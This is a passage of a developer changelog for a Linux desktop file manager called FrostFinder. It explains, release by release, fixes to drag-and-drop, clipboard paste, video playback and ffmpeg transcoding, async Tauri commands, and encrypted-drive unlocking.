**What the log showed:** At +66.965s user clicked a file. Repeated RENDER calls fired at +67.005, +69.217, +71.667, +71.767. The RENDER pairs are exactly the signature of `disarm(true)` being called after `active=true` — the 200ms hold timer was firing before the user even started moving, activating selection mode and setting `draggable=false`. Every subsequent drag gesture was silently blocked.

**Why 200ms was wrong:** Many users naturally pause for 100–400ms between mousedown and the start of a drag motion. The 200ms timer made no allowance for this pause — any hesitation triggered selection mode and killed DnD.

**New architecture — `dragstart` as final arbiter:**

1. `mousedown` → arm + start **600ms** timer  
2. Pointer moves **>5px** before timer fires → `disarm()` immediately. `draggable` stays `true`. Browser fires `dragstart` on the row. DnD proceeds.
3. `dragstart` fires (capture phase, before `setupDragDrop`'s handler):
   - `wantSelection=true` (timer already fired) → `preventDefault()` + `stopPropagation()` + set `draggable=false` → DnD cancelled → selection proceeds
   - `wantSelection=false` → `disarm()`, do **not** preventDefault → DnD handler on row runs normally
4. Timer fires (600ms, <5px movement) → `wantSelection=true`, activate selection mode  
5. `mouseup` → `disarm()`, restore `draggable=true`

Any drag where the user moves within 600ms works perfectly. Selection requires an explicit 600ms hold with no movement.

### Added: `DRAG_START` and `DROP` debug log entries (`src/main.js`)

`setupDragDrop` now logs `DRAG_START {name, count, srcDir}` and `setupDropTarget` logs `DROP {destPath, count, op}`. Future debug logs will confirm whether DnD events are firing at all.

---

## What's in Beta-3-r6

No Rust recompile needed.

### Fix: Drag-and-drop and clipboard paste silently did nothing (`src/main.js`)

**Root cause — JavaScript temporal dead zone (TDZ).** Both the drop handler and `clipboardPaste` had this pattern:

```js
const done = new Promise(resolve => { _resolve = resolve; }); // callback runs synchronously
const unlisten = await listen(..., ev => { if (finished) _resolve(); });
let _resolve;  // ← declared AFTER it was already used above
```

`let` declarations are hoisted to the top of their scope but remain in the **temporal dead zone** until the declaration is physically reached in execution order. The `new Promise(...)` callback runs synchronously — at that moment `_resolve` is in TDZ. Assigning to a TDZ variable throws a `ReferenceError`. Since both handlers are `async` and not awaited by the caller, the error is silently swallowed. Nothing moved, nothing copied, no toast, no error — just silence.

This affected:
- **Drag-and-drop** (`drop` event handler) — `let _ddResolve` was declared 3 lines after the Promise that tried to assign it. Every drag-and-drop silently failed.
- **Clipboard paste** (Ctrl+V / right-click Paste) — `let _pasteUnlisten` was declared after the Promise. Every paste silently failed.

**Fix:** Move both `let` declarations to before their respective `new Promise` calls.

---

## What's in Beta-3-r5

No Rust recompile needed.

### Fix: Drag-and-drop (move/copy) broken in column view — root cause finally correct (`src/views.js`)

**What the debug log showed:** User tried to drag `FrostFinder-beta-2-r55` to move it. `attachDragSelect` activated instead — sweeping 5 rows into selection. `selSize=5` then broke subsequent single-clicks (navigation requires `sel.size===1`). DnD never happened.

**Why r4 was still wrong:** r4 called `ev.preventDefault()` on `mousemove` to prevent DnD, relying on the HTML spec clause "browsers MUST NOT initiate DnD if mousemove is cancelled." WebKit2GTK ignores this. DnD and selection still raced — selection won, DnD lost, every drag gesture in column view selected rows instead of moving files.

**Correct fix — hold timer + `draggable=false`:**

- Restored 200ms hold timer. Movement >5px before timer fires → `disarm()` immediately → DnD proceeds untouched. Timer fires with pointer still → selection activates.
- When selection activates: `colList.querySelectorAll('.frow').forEach(r => r.draggable = false)`. This is unconditional — no spec interpretation, no browser quirk. Once `draggable=false`, the browser physically cannot start a drag operation for the rest of the gesture.
- On `disarm()`: `r.draggable = true` restored on all rows so DnD works again for the next gesture.

**Usage:** Click and hold a row for 200ms without moving → drag to select range. Quick drag → moves/copies files as usual.

---

## What's in Beta-3-r4

No Rust recompile needed.

### Fix: Drag-and-drop broken in column view (`src/views.js`)

**Root cause:** `attachDragSelect.activate()` added a capture-phase `dragstart` listener (`suppressDrag`) to `colList`. Capture-phase listeners run before any bubble-phase listeners, so this fired before `setupDragDrop`'s `dragstart` handler on every `.frow` element. Every drag gesture in column view — whether the user intended to move a file or select multiple files — was immediately cancelled by `suppressDrag`. DnD never worked once selection code was added.

**Fix — two-part:**

1. **`ev.preventDefault()` on the activating `mousemove`:** Per the HTML spec, browsers MUST NOT initiate a drag operation if `mousemove` is cancelled. When `attachDragSelect` decides the user is doing a selection drag (movement > 8px), it now calls `ev.preventDefault()` on that exact `mousemove`. This cleanly prevents DnD from starting, without touching `dragstart` at all.

2. **`dragstart` as DnD-wins signal:** If the browser fires `dragstart` before we activate selection (fast drag, user intent is DnD), a non-capturing `dragstart` listener on `colList` calls `disarm()` so selection mode cancels and DnD proceeds normally through `setupDragDrop`'s handler.

3. **Removed the `dragstart` suppressor entirely.** No more capture-phase blocking.

**Threshold raised from 4px to 8px:** The browser's native DnD threshold is ~4px. By setting ours to 8px, the browser gets first opportunity to fire `dragstart` for fast drags (DnD intent). Slow deliberate downward drags cross 8px before `dragstart` fires (selection intent). The two modes are cleanly separated.

---

## What's in Beta-3-r3

**Rust recompile required.**

### Fix: Extracting archives freezes the app (`src-tauri/src/main.rs`)

**Root cause:** `extract_archive` was a synchronous `#[tauri::command]`. Tauri runs sync commands on an IPC handler thread and the JS `await invoke(...)` suspends the entire WebView event loop waiting for the response. A large zip or tar file can take several seconds, causing the window to go completely unresponsive.

**Fix:** `extract_archive` is now `async` and calls `tokio::task::spawn_blocking(...)` to run the blocking I/O on a dedicated thread pool thread. The WebView stays fully responsive while extraction runs. Same fix applied to `compress_files`.

### Fix: `listen` race condition causing paste/copy to hang forever (`src/main.js`)

**Root cause:** `clipboardPaste` set up the progress listener like this:

```js
const done = new Promise(resolve => {
  listen('file-op-progress', ev => { ... if(finished) resolve(); })
    .then(fn => { unlisten = fn; });  // async — not awaited
});
invoke(cmd, {...});  // fires immediately on next line
await done;
```

`listen()` is itself async — it must round-trip to the Tauri event bus to register the listener. `invoke()` fires on the very next line. For any fast operation (small file, same-filesystem move which is just a rename), Rust emits `finished: true` before the JS callback is registered. The `done` Promise never resolves. The UI hangs at `await done` indefinitely.

**Fix:** `await listen(...)` before `invoke()`. Listener is guaranteed to be registered before any events can fire.

### Fix: Drag-and-drop was synchronous and blocked the UI (`src/main.js`)

**Root cause:** The drag-drop handler called `invoke('copy_file',...)` / `invoke('move_file',...)` in a sequential loop. Each `await invoke(...)` blocked the JS event loop until that file finished. Dragging 5 large files would block the UI 5 times in series.

**Fix:** Drag-drop now uses `copy_files_batch` / `move_files_batch` with the same `listen`-before-`invoke` pattern and a live progress bar for multi-file drops.

### Fix: `copy_file` and `move_file` tauri commands were synchronous (`src-tauri/src/main.rs`)

Both commands (used by undo/redo and drag-drop) were sync `#[tauri::command]` functions that blocked the IPC thread. Both are now `async` with `tokio::task::spawn_blocking`. Internal sync helper functions `copy_file_sync` / `move_file_sync` are kept for use by `copy_files_batch` / `move_files_batch`.

---

## What's in Beta-3-r2

No Rust recompile needed.

### Bigger default icon size (`src/main.js`)
Default icon size bumped from `80px` → `112px`. Slider range unchanged (28–120px); user can still adjust live with the toolbar slider.

### Column view: instant click-and-drag selection (`src/views.js`)
Previous model required a **150ms hold timer** before drag-select activated. If you moved more than 8px during the hold, native file-drag won instead, making it very hard to reliably trigger drag-select.

New model: **no hold timer**. Drag-select activates the moment the pointer crosses a 4px movement threshold after `mousedown`. Feels instantaneous. `mouseup` without crossing the threshold is still a normal single-click — no behaviour change for click-to-open.

Highlight updates are now **rAF-throttled**: `syncClasses()` schedules one `requestAnimationFrame` per drag event, so even on large directories the DOM class updates run at exactly 60fps with no extra work on intermediate frames.

### Performance tweaks (`src/style.css`)
- `frow` hover/select transition: `0.08s` → `0.05s` (snappier keyboard navigation and hover feedback)
- `icon-item` transition: `0.1s` → `0.05s` (icon view selections feel instant)

---

## What's in Beta-3-r1

No Rust recompile needed.

### Fix: Video controls permanently broken in WebKit (`src/views.js`, `src/style.css`)

**Root cause:** The seek bar was built using a transparent `<input type="range">` overlay (`opacity:0; height:20px; position:absolute; z-index:2`). This is the standard "invisible drag handle" pattern but it is fundamentally broken in WebKit2GTK: a `disabled` input still participates in hit-testing, and even at `opacity:0` the 20px-tall element extends below the 4px seek track directly over the Play/Mute/Fullscreen buttons in the row below, intercepting their pointer events. No amount of `disabled`, `pointer-events`, or `opacity` fixes fully resolve this — WebKit's hit-testing for form inputs is spec-compliant but interferes with overlapping elements.

**Fix:** Removed the `<input type="range">` entirely. Seek is now handled via `pointerdown`/`pointermove`/`pointerup` directly on the `.vc-seek-track` element using `setPointerCapture` for clean drag behaviour. The button row is 100% unobstructed. CSS simplified to remove all range-input-specific rules.

### Fix: 4K MKV (HEVC) not playing in Quick Look (`src/ql-window.js`)

**Root cause:** QL had its own video element with `vid.controls = true` and an 8-second stall timer that showed an mpv fallback message — **no transcode fallback**. HEVC/4K MKV files that stall at `readyState=0` in WebKit2GTK just showed the error panel after 8 seconds.

**Fix:** QL now has the same 5s stall → ffmpeg transcode fallback as the main player. Added `getTranscodeUrl()` to `ql-window.js`. The stall timer switches `vid.src` to the `/transcode/` endpoint, calls `vid.play()`, and shows a `⚡ Transcoding via ffmpeg…` hint. A secondary 20-second timer falls back to the mpv error panel only if transcoding also fails. The `error` event also triggers the transcode path before giving up.

---

## What's in Beta-2-r55

**Rust recompile required.**

### Fix: Encrypted USB drive unlock always failing despite correct passphrase (`src-tauri/src/main.rs`)

**Root cause:** `udisksctl` is a D-Bus client — it does not read our process's stdin. The `--key-file /dev/stdin` approach assumes udisksctl opens `/dev/stdin` in our process, but the actual file I/O happens inside the `udisksd` daemon, which has its own stdin (likely `/dev/null`). So the passphrase was silently dropped and every unlock attempt returned "failed to activate" regardless of the passphrase entered.

**Fix:** Write the passphrase to a temp file in `/dev/shm` (tmpfs — in-memory, never written to disk), `chmod 600` it before writing, pass it as `--key-file /dev/shm/frostfinder_key_PID`, then delete it immediately after the unlock attempt — whether it succeeded or failed. The error detection now also checks `stdout` in addition to `stderr` since some udisksctl versions write the error to stdout.

### Fix: Video controls blocked during 4K MKV transcode playback (`src/views.js`)

**Root cause 1 — pointer event blocker:** `_setLiveMode(true)` set `elSeek.style.opacity = '0.35'`. The seek `<input type="range">` is normally invisible (`opacity:0` in CSS) and serves as a 20px-tall transparent drag overlay. Making it `opacity:0.35` rendered it as a semi-visible browser-default slider that extended ~10px below the seek track, directly overlapping the Play/Mute/Fullscreen buttons in the row below and swallowing their pointer events.

**Fix:** `_setLiveMode` now always keeps `elSeek.style.opacity = '0'`. Live mode is indicated by dimming `elFill.style.opacity` to `0.4` instead.

**Root cause 2 — controls hidden when transcode starts:** The auto-hide timer ran during the 5-second stall wait. When the stall timer fired and removed the overlay, the controls bar could already be hidden (`opacity:0; pointer-events:none`). `_showBar()` is now called explicitly when the transcode fallback is triggered.

---

## What's in Beta-1-r54

### Feature: Passphrase prompt for encrypted USB drives (`src-tauri/src/main.rs`, `src/main.js`, `src/style.css`)

**Rust recompile required.**

LUKS-encrypted drives (`crypto_LUKS`) and BitLocker drives (`crypto_BITLK`) now prompt for a passphrase before mounting instead of failing silently.

**Detection:** The `DriveInfo.filesystem` field already comes through from `lsblk` correctly as `crypto_LUKS` or `crypto_BITLK`. The mount button checks `d.filesystem` and sets `data-encrypted="true"` on the button when the drive is encrypted.

**New Rust command — `unlock_and_mount_encrypted(device, passphrase)`:**
1. Runs `udisksctl unlock -b <device> --key-file /dev/stdin` with the passphrase piped to stdin
2. Parses `"Unlocked /dev/sdb1 as /dev/dm-0."` to get the dm device path
3. Runs `udisksctl mount -b /dev/dm-0` and returns the mountpoint
4. Returns a friendly `"Wrong passphrase — please try again."` error when udisksctl reports activation failure

**JS password dialog (`_showUnlockDialog`):**
- Purple lock icon on mount button for encrypted drives
- Modal overlay with passphrase input, show/hide toggle (eye icon), error display, Enter key to confirm, Escape/backdrop to cancel
- On success: dismisses dialog, shows success toast, refreshes drives, navigates to mountpoint
- On wrong passphrase: shows error inline, re-selects input for immediate re-entry

---

## What's in Beta-1-r53

### Fix: Controls not working during ffmpeg transcode playback (`src/views.js`, `src/style.css`)

**Root cause:** The ffmpeg transcode endpoint streams a fragmented MP4 via pipe with `-movflags frag_keyframe+empty_moov`. This means `video.duration = Infinity` from the start — there's no container-level duration because ffmpeg is writing as it transcodes. The `_updSeek` function had a guard `if (!isFinite(video.duration)) return` that exited immediately on every `timeupdate` event. Result: seek bar frozen at 0, time display stuck at "0:00 / 0:00", making the controls appear completely broken even though play/pause and volume worked fine.

**Fixes (`src/views.js`):**

- `_updSeek`: when `video.duration` is not finite, still updates time display with elapsed time (`fmt(video.currentTime)`) instead of bailing out entirely
- `loadedmetadata`/`durationchange` listeners: call `_setLiveMode(true)` which sets `elSeek.disabled = true` and dims the seek bar — makes clear that seeking isn't available for pipe streams
- Seek/change handlers: already gated on `isFinite(video.duration)`, so disabling the input also prevents drag scrub
- Stall timer (transcode trigger): now auto-dismisses the click-to-play overlay (`_overlay` ref) and starts playback automatically via a `canplay` listener. Previously the overlay remained and the user had to click it a second time after the "Transcoding…" hint appeared
- `_overlay` stored as a closure variable; both the overlay's own click handler and the stall timer clear it via `_overlay = null` to prevent double-remove

**Fixes (`src/style.css`):**

- `.vc-seek:disabled` keeps the input invisible (opacity:0) so the track still looks the same but isn't interactive
- `.vc-seek-track:has(.vc-seek:disabled):hover` suppresses the track height expansion on hover, so hovering over a live-mode seek bar doesn't give false affordance

No Rust recompile needed.

---

## What's in Beta-1-r52

### Fix: 4K MKV (and all HEVC/stalling video) stopped playing (`src/views.js`)

**Root cause:** `_isActive()` on line 384 referenced `_player[role]` — both `_player` and `role` were variables from an intermediate revision that were removed when the player tracking was simplified to `_stopSlot`/`_ensureMutualExclusion`. They were `undefined`, so `_player[role]` threw a `ReferenceError` every time the stall timer fired.

The stall timer is the sole mechanism for falling back from a stalled native `<video>` to the ffmpeg transcode proxy. When it crashed, 4K HEVC MKV files (which stall at `readyState=0` in WebKit2GTK) never received the transcoding fallback and stayed stuck on the loading spinner indefinitely.

**Fix:**
- `_isActive()` now uses `!wrapper._dead && wrapper.isConnected` — no external state
- `wrapper._dead = true` is set at the top of `_cleanup()`, so any in-flight stall timer or error handler that fires after cleanup immediately returns

No Rust recompile needed.

---

## What's in Beta-1-r51

### Fix: Background audio + preview showing stale video after gallery navigation (`src/views.js`)

**Root cause — cross-slot global registry:** `_player.gallery` and `_player.preview` were supposed to keep gallery and preview independent, but `_stopPlayer('gallery')` only killed the gallery player. When gallery navigated to a new file, the preview player for the old file kept running in the background producing audio.

**Root cause — `panel.innerHTML` bypassed cleanup:** `renderPreview()` replaced the full panel HTML *before* stopping the old player. This detached the old `media-preview-slot` from the DOM without calling `_mpvCleanup`, leaving the video element live.

**Root cause — dead `sameVideo`/`alreadyPlaying` guards:** Both checks referenced `_activeVideoPath` and `_activeVideoWrapper` which were deleted in r50. They resolved to `undefined`, so the guards were always false — preview tore down and remounted on every `render()` call, causing the "stale video file" flash on every selection change.

**Fixes:**
- Removed `_player` registry entirely. Cleanup is stored only on `slot._mpvCleanup` — no cross-slot global state.
- `renderPreview()` now calls `_stopSlot(_prevSlot)` before `panel.innerHTML=...`, stopping the old player while the slot is still reachable.
- `sameVideo` guard rewritten using `panel.dataset.previewPath === e.path && slot._mpvCleanup` — information on the DOM elements, not deleted globals.
- Added `_ensureMutualExclusion()`: a single capture-phase `play` listener on `document`. When any `<video>` fires `play`, all other video elements are immediately paused — belt-and-suspenders guarantee at most one video plays at a time.

No Rust recompile needed.

---

## What's in Beta-1-r50

Three interconnected bugs all rooted in how the video player interacts with DOM teardown.

### Fix: Video plays audio in background after navigation (`src/views.js`)

**Root cause:** The stall-detection timer and the GStreamer error handler both called `video.play()` unconditionally — even while the click-to-play overlay was still covering the video. So a stalled video (HEVC, slow to init) would switch to the transcode proxy and start playing silently before the user clicked anything.

**Fix:** Added `_userStarted` boolean (starts `false`, becomes `true` only when the user clicks the overlay or `autoplay=true` is passed). The stall timer and error handler now gate `video.play()` on `_userStarted`.

### Fix: `_stopActiveVideo` couldn't clean up after `panel.innerHTML=''` (`src/views.js`)

**Root cause:** `_stopActiveVideo` found the slot's cleanup function via DOM traversal (`wrapper.closest('[data-mpv-active]')`). When `panel.innerHTML=''` or `gSlot.innerHTML=''` detached the wrapper from the DOM, `closest()` returned `null`, cleanup was skipped, and the old `document.addEventListener('keydown', _fsKey)` listener was never removed. Multiple `_fsKey` listeners stacked up.

**Fix:** The cleanup function is now stored directly on `wrapper._cleanup` in addition to `slot._mpvCleanup`. `_stopActiveVideo` calls `_activeVideoWrapper._cleanup()` directly — no DOM traversal needed, works even when the wrapper is detached.

Also fixed `_mpvStop(host)`: it was calling `host.querySelector('[data-mpv-active]')` which only searches *descendants*, but `data-mpv-active` is set on the *slot element itself*. Fixed to check `host.dataset?.mpvActive ? host : host.querySelector(...)`.

### Fix: Preview panel not showing video files (`src/views.js`)

**Root cause:** `renderPreview()` is called on every `render()` (selection change, sort, scroll, etc.). Each call did `panel.innerHTML = '...'` which destroyed the existing video wrapper, then called `_mountMpvPlayer` again. `_stopActiveVideo()` at the start of `_mountMpvPlayer` then killed the just-mounted player from the *same* render call. Net result: the video player was constantly being created and destroyed.

**Fix:** Added a `sameVideo` short-circuit at the top of `renderPreview`: if `_activeVideoPath === e.path` and the wrapper is still connected to the DOM, skip the full re-render and only update the tags section. This means the video player is mounted once and stays mounted until the selected file actually changes.

No Rust recompile needed.

---

## What's in Beta-1-r49

### Fix: Video controls not working (`src/views.js`, `src/style.css`)

Root cause: the seek `<input type="range">` was only 4px tall (matching the track height), making it nearly impossible to interact with on WebKit. Fixed by giving the input `height:20px` centered over the track via `transform:translateY(-50%)`, so the full drag/click target is 20px.

Volume slider was using a CSS-hover expand trick (`width:0 → 60px`) that didn't work reliably. Replaced with fixed `56px` always-visible width.

### Fix: Gallery + preview playing simultaneously; audio in background (`src/views.js`)

Root cause: `_mountMpvPlayer` created independent `document.addEventListener('keydown', ...)` handlers for Space, Arrow, M each time it was called — with no coordination between the gallery slot and the preview slot. Result: both players ran in parallel, all keyboard events fired for both.

Fix — two changes:

**1. Module-level `_activeVideoWrapper`**: At the top of `_mountMpvPlayer`, `_stopActiveVideo()` is called to pause and clean up any existing video player before the new one starts. This ensures only one player is ever active at a time, regardless of which slot (gallery or preview) triggered the mount.

**2. Keyboard events scoped to wrapper**: Space/Arrow/M keyboard shortcuts are now attached to `wrapper.addEventListener('keydown')` (with `wrapper.tabIndex=-1`) instead of `document`. The wrapper receives focus when the user clicks the video or the controls bar. This prevents the two players from interfering with each other via document-level listeners. Only `F` (fullscreen) remains on `document` since that's a global action.

No Rust recompile needed.

### Fix: Newaita Reborn not appearing in icon theme picker (`src/utils.js`)

The picker hardcodes the list of bundled themes. Newaita was added to `ICON_THEMES` but not to the `discovered` array in `showIconThemePicker`. Added it alongside Kora and WhiteSur.

No Rust recompile needed.

---

## What's in Beta-1-r48

### Feature: Custom video controls (`src/views.js`, `src/style.css`)

Replaced `video.controls = true` (WebKit2GTK's native controls bar) with a fully custom controls UI. The native bar is inconsistent, shows a non-functional fullscreen button, and can't be styled. The new controls:

- **Play/Pause** — button + click anywhere on video. Keyboard: `Space`
- **Seek bar** — smooth gradient fill + buffered indicator. Drag to scrub. Keyboard: `←` / `→` (±5s). Thumb appears on hover.
- **Time display** — `current / total` in `M:SS` or `H:MM:SS` format with tabular numerals.
- **Volume slider** — slides out on hover from the mute button. Keyboard: `M` to toggle mute.
- **Fullscreen (mpv)** — the existing mpv handoff button is now integrated into the controls bar. Keyboard: `F`.
- **Auto-hide** — controls fade out 2.5s after the last mouse movement while playing. Always visible while paused or on hover.

No Rust recompile needed.

---

### Feature: Newaita Reborn icon theme (`src/icons-newaita.js`, `src/utils.js`)

Added Newaita-reborn-fedora as a bundled icon theme. The theme includes folder icons only (the archive has no mimetypes/ directory); file and drive icons fall back to built-in.

Folder variants: base, home, documents, downloads, pictures, music, videos, desktop, development/git, network, archives. Named folders (e.g. a directory called `Downloads`) automatically get the matching variant icon. Trash icons (empty + full) included from the 48px set.

No Rust recompile needed.

---

## What's in Beta-1-r47

### Fix: + (New) button dropdown invisible — `overflow:hidden` clipping (`src/style.css`, `src/main.js`)

**Root cause:** `.tb-actions` had `overflow:hidden`. The dropdown is `position:absolute` inside `.tb-new-wrap` which is a child of `.tb-actions`. Even though the dropdown had `z-index:8000`, the `overflow:hidden` on the ancestor clipped it before it could be painted. The button was working — the dropdown just wasn't visible.

**Fix:** Changed `.tb-actions` to `overflow:visible`. Child flex elements still shrink correctly via `flex-shrink:1;min-width:0` — `overflow:hidden` was not needed for that. Also hardened the JS toggle: added a `_newDropOpen` boolean to track state correctly, and used `{capture:true}` on the outside-click listener so it fires before any other handler.

No Rust recompile needed — CSS + `src/main.js` only.

---

### Feature: Automatic ffmpeg transcoding proxy for HEVC/MKV (`src-tauri/src/main.rs`, `src/views.js`, `src/main.js`)

**Root cause:** WebKit2GTK's GStreamer pipeline cannot decode 10-bit HEVC (x265) in MKV containers even with `gst-plugin-va` installed. The VA-API pipeline that GStreamer exposes to WebKit does not support 10-bit HEVC profiles on most setups, and the WebKit→GStreamer negotiation fails silently (no `error` event).

**Fix — `/transcode/` media server endpoint (Rust):**

A new URL prefix `/transcode/` is handled by the existing media server thread pool. When hit:

1. **VAAPI path** (fast, hardware): spawns `ffmpeg -hwaccel vaapi -hwaccel_device /dev/dri/renderD128 ... -c:v h264_vaapi -c:a aac -f mp4 -movflags frag_keyframe+empty_moov+default_base_moof pipe:1`
2. **Software fallback**: if VAAPI fails (device not found, driver error, or encode error), spawns `ffmpeg ... -c:v libx264 -preset veryfast -crf 24 -c:a aac ... pipe:1`

Output is streamed directly to the HTTP response without buffering. The fragmented MP4 format (`frag_keyframe+empty_moov`) lets WebKit start playback before transcoding is complete.

**Fix — automatic stall→transcode switching (JS, `_mountMpvPlayer`):**

The stall detection timer is now 5 seconds (down from 8). When it fires:
- Instead of showing an error panel, the video `src` is silently switched to `getTranscodeUrl(path)` (the `/transcode/` endpoint)
- A subtle "Transcoding via ffmpeg…" label appears below the video controls
- A 20-second secondary timer shows the error panel only if transcoding also fails

The error panel now correctly says "ensure `ffmpeg` is installed" rather than giving GStreamer package instructions.

`getTranscodeUrl()` is added to `main.js` and injected via `injectDeps` so views.js can access it.

**Requires Rust recompile** — `src-tauri/src/main.rs` changed (new `/transcode/` endpoint).

---



### Fix: 4K H.265/HEVC MKV playback — missing env vars + wrong error message (`src-tauri/src/main.rs`, `src/views.js`, `src/ql-window.js`)

**Root cause analysis (from GStreamer/WebKit2GTK Wayland diagnostics):**

The existing env vars (`WEBKIT_DISABLE_DMABUF_RENDERER=1`, `GST_VAAPI_ALL_DRIVERS=1`) were necessary but insufficient. Two things were missing:

**1. `GST_USE_NEW_VA=1` (Rust, `main.rs`)**

GStreamer has two VA-API plugin stacks:
- Old: `gst-vaapi` → elements `vaapih265dec`, `vaapih264dec` — legacy, broken on Wayland with modern Mesa
- New: `gst-plugin-va` → elements `vah265dec`, `vah264dec` — required for 4K HEVC on Wayland

Without `GST_USE_NEW_VA=1`, GStreamer may pick the old `vaapi` elements even when `gst-plugin-va` is installed, leading to silent decode failure. This env var forces the new `va` stack.

**2. `WEBKIT_USE_GLDOM=1` (Rust, `main.rs`)**

Tells WebKit to render the DOM tree using GL, enabling decoded video frames to be composited without a CPU round-trip. Required for smooth hardware-decoded video on Wayland compositors (Hyprland, Sway, etc.).

**3. Wrong install instructions in stall/error panel (JS)**

The error message said "Install `gst-plugins-bad`". The actual missing packages for HEVC on Arch/CachyOS are:
- `gst-libav` — FFmpeg bridge; provides the H.265 bitstream parser GStreamer needs
- `gst-plugin-va` — the new VA-API element stack (not `gst-vaapi`)

The error panel now shows the correct packages and includes the diagnostic command:
```
gst-inspect-1.0 va | grep hevc
```
If this returns nothing, `gst-plugin-va` is missing or not finding the VA driver.

**4. Stall detection timeout raised from 4 s → 8 s**

The VA-API pipeline for 4K HEVC takes 2–5 seconds to initialise on first open (driver load, surface allocation). The 4-second timer was firing before the pipeline had a chance to succeed, incorrectly showing the fallback panel for files that would have played fine. 8 seconds gives the pipeline enough headroom.

**Requires Rust recompile** — `src-tauri/src/main.rs` changed (new env vars).

---



### Fix: + (New) button dropdown opens and immediately closes (`src/main.js`)

**Root cause:** The `document.addEventListener('click', close, {once:true})` call
was made synchronously inside the button's click handler. Even though the button
called `e.stopPropagation()`, that only stops the event from bubbling through the
DOM tree — it does not stop document-level listeners that were already queued for
the same event. The once-listener therefore fired on the very click that opened
the dropdown, closing it instantly.

**Fix:** The close listener is now registered inside a `setTimeout(..., 0)`,
which defers it to the next event loop tick. By then the current click event has
fully finished, so the listener only catches subsequent clicks that should close
the dropdown.

No Rust recompile needed — `src/main.js` only.

---

### Fix: MKV files auto-launched mpv instead of playing in gallery/preview/QL (`src/views.js`, `src/ql-window.js`)

`mkv` was included in `WEBKIT_SKIP_EXTS`, which bypassed the `<video>` element
entirely and called `mpv_open_external` immediately. WebKit2GTK can play H.264
and VP9 content inside MKV containers natively; only HEVC/H.265 MKV falls back
(via the 4-second stall-detection timer). Removed `mkv` from the skip set in
both files. AVI, MOV, M4V and OGV remain in the set as they reliably fail.

No Rust recompile needed — `src/views.js` and `src/ql-window.js` only.

---

### Fix: Column view drag-select never activated (`src/views.js`)

**Root cause:** `attachDragSelect.onDown` contained the guard:

```js
if (ev.target.closest('button,a,input,[draggable="true"]')) return;
```

Every `.frow` in column view has `draggable="true"` set by `setupDragDrop`, so
the guard caused `onDown` to return immediately on every row click — the
drag-select function never ran at all.

**Fix:** Removed `[draggable="true"]` from the guard and replaced the
immediate-activation logic with a 5 px movement threshold, mirroring the
rubber-band approach. The drag-select and the HTML5 file drag now coexist via
a race:

- **Movement ≤ 5 px** → `dragstart` fires first → browser file-drag wins; drag-select stays idle.
- **Movement > 5 px before `dragstart`** → drag-select activates; a capture-phase `dragstart` listener on `colList` calls `ev.preventDefault()` and `ev.stopPropagation()` to cancel the browser's file drag so both don't run simultaneously.

No Rust recompile needed — `src/views.js` only.

---



### Fix: UI freezes when moving/copying/extracting many files (`src-tauri/src/main.rs`, `src/main.js`)

**Root causes — three independent problems:**

**1. Sequential IPC round-trips in `clipboardPaste` (JS)**

`clipboardPaste()` used a `for…of await invoke(...)` loop — pasting 100 files
meant 100 serial Tauri IPC calls, each blocking the JS event loop until Rust
finished the individual copy or move. The UI was completely unresponsive for the
duration.

**Fix — `copy_files_batch` / `move_files_batch` commands (Rust):**

Two new `#[tauri::command]` functions replace the per-file calls. Each accepts a
`Vec<String>` of source paths and a destination directory, spawns a dedicated OS
thread (`std::thread::spawn`), and processes files sequentially inside that
thread — completely off the WebView thread. After each file, a `file-op-progress`
event is emitted to the window:

```json
{ "done": 3, "total": 10, "name": "video.mkv", "finished": null }
```

The final event carries `"finished": true`.

`clipboardPaste()` now calls the batch command (which returns immediately) then
`await`s a `Promise` that resolves when the `finished` event arrives. The JS
event loop is free the entire time — the UI stays responsive.

**2. `clipboardPaste` progress UI**

For operations with more than one file, a live progress bar toast now appears
("Copying 3 / 10 …") driven by the `file-op-progress` events. It dismisses
automatically on completion.

**3. ZIP extraction buffered entire files into `Vec<u8>` (Rust)**

`extract_archive` for ZIP files called `file.read_to_end(&mut buf)` — loading
each compressed entry fully into RAM before writing it. For large archives this
caused huge allocations and potential OOM.

**Fix:** replaced with `std::io::copy(&mut file, &mut outfile)` — streams
directly from the decompressor to disk using an 8 KB kernel buffer with no
intermediate allocation.

**4. Extract progress toast**

`extractArchive` now shows a spinner toast with the archive filename while Rust
works, replacing the generic "Extracting…" text that gave no context. The
spinner dismisses immediately when extraction finishes.

**Requires Rust recompile** — `src-tauri/src/main.rs` changed (new
`copy_files_batch`, `move_files_batch` commands, ZIP streaming fix).

---



### Fix: MKV / HEVC videos auto-open in mpv instead of showing stall error (`src/views.js`, `src/ql-window.js`)

**Root cause:**

WebKit2GTK + GStreamer cannot decode H.265 / HEVC in-process even when
`gst-plugins-bad` and `mpv` are both installed. The GStreamer HEVC decoder
requires a VA-API path that WebKit's internal pipeline does not expose in the
same way mpv's direct decoder stack does. The r41 stall-detection timer was
correctly identifying the failure, but the UX — a 4-second wait followed by a
manual button click — was poor given mpv is available and works.

**Fix — `WEBKIT_SKIP_EXTS` bypass:**

A new `const WEBKIT_SKIP_EXTS = new Set(['mkv','avi','mov','m4v','ogv'])` is
defined at the top of both `src/views.js` and `src/ql-window.js`. These are
container formats that WebKit2GTK reliably fails to play in-process regardless
of installed GStreamer plugins.

When `_mountMpvPlayer` (gallery view / preview panel) or `renderEntry` (Quick
Look window) encounters a path whose extension is in `WEBKIT_SKIP_EXTS`:

1. The `<video>` element is **never created** — no stall, no 4-second wait.
2. A "Opening in mpv…" placeholder panel is shown immediately with the
   filename and a play icon.
3. `invoke('mpv_open_external', { fullscreen: false })` is called automatically —
   mpv opens in its own window without any user interaction.
4. A **⛶ Full screen** button in the placeholder lets the user promote to
   fullscreen mpv at any time.
5. If mpv itself fails to launch, the placeholder's subtitle updates to show
   the error message.

The r41 stall-detection timer and error handler are retained for `mp4`, `webm`,
and any other format in `VIDEO_EXTS` that is not in `WEBKIT_SKIP_EXTS`, as a
safety net for unexpected per-file decode failures.

No Rust recompile needed — `src/views.js` and `src/ql-window.js` only.

---



### Change: icon view default size increased to 80 px; slider max raised to 120 px (`src/main.js`)

Default bumped from 60 → 80. Slider upper bound raised from 80 → 120. Users who
have already adjusted the slider keep their saved preference (localStorage takes
precedence over the default).

No Rust recompile needed — `src/main.js` only.

---

### Feature: click-and-hold drag selection in column view (`src/views.js`)

**New `attachDragSelect` function:**

Pressing and holding the left mouse button on any row in a column, then dragging
over other rows, progressively adds each row under the pointer to the current
selection. Rows highlight live as the pointer enters them — no rubber-band
rectangle is drawn.

Behaviour:
- **Drag from a row** — starts a drag-select. Without modifier keys, the existing
